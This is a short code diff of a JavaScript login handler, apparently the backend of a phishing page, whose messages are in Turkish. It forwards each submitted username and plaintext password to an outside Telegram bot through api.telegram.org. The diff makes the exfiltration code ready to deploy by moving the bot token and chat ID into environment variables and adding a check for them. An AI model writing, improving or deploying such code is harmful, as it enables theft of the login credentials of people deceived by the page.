@@ -5,10 +5,14 @@ export default async function handler(req, res) {
 
   const { username, password } = req.body;
 
-  const BOT_TOKEN = "BURAYA_BOT_TOKENİNİ_YAZ";
-  const CHAT_ID = "BURAYA_CHAT_ID_YAZ";
+  const BOT_TOKEN = process.env.BOT_TOKEN;
+  const CHAT_ID = process.env.CHAT_ID;
 
-  const text = `📥 Yeni Giriş\n👤 Kullanıcı Adı: ${username}\n🔐 Şifre: ${password}`;
+  if (!BOT_TOKEN || !CHAT_ID) {
+    return res.status(500).json({ message: "Environment variables eksik." });
+  }
+
+  const text = `📥 Yeni Giriş\\n👤 Kullanıcı Adı: ${username}\\n🔐 Şifre: ${password}`;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
